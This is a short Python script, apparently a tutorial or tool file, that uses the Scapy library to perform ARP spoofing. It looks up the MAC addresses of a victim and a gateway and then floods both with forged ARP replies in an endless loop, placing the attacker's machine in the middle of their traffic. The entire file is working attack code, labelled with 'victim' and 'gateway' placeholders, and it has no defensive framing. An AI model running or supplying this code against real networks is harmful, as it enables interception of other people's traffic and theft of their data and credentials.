from scapy.all import *
import time
import sys

def get_mac(ip):

    # Scapy function to send an ARP request and get the MAC address
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    ans, _ = srp(arp_request_broadcast, timeout=1, verbose=False)

    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac):
    
    if not target_mac:
        print(f"[-] Could not find MAC address for {target_ip}")
        return

    # op=2 means "ARP Reply" (is-at)
    # pdst = "Who am I talking to?" (The Victim)
    # hwdst = "Victim's MAC Address"
    # psrc = "Who am I pretending to be?" (The Router/Gateway)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # send the packet (verbose=False hides the output)
    send(packet, verbose=False)

# USAGE EXAMPLE in a loop:
# target_ip = "192.168.1.5" (Victim)
# gateway_ip = "192.168.1.1" (Router)
# target_mac = get_mac(target_ip)
# gateway_mac = get_mac(gateway_ip)
# print("[+] Starting ARP Spoofing...")
# sent_packets_count = 0
# while True:
#     spoof(target_ip, gateway_ip, target_mac)
#     spoof(gateway_ip, target_ip, gateway_mac)
#     sent_packets_count += 2
##    \r prints on the same line so it looks cleaner
#     print(f"\r[+] Packets sent: {sent_packets_count}", end="")
#     time.sleep(2)

if __name__ == "__main__":
    victim_ip = "<VICTIM_IP>"
    gateway_ip = "<GATEWAY_IP>"

    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    print("[+] Victim MAC:", victim_mac)
    print("[+] Gateway MAC:", gateway_mac)
    print("[+] Starting ARP spoofing... Press CTRL+C to stop")

    while True:
        spoof(victim_ip, gateway_ip, victim_mac)
        spoof(gateway_ip, victim_ip, gateway_mac)
        time.sleep(2)
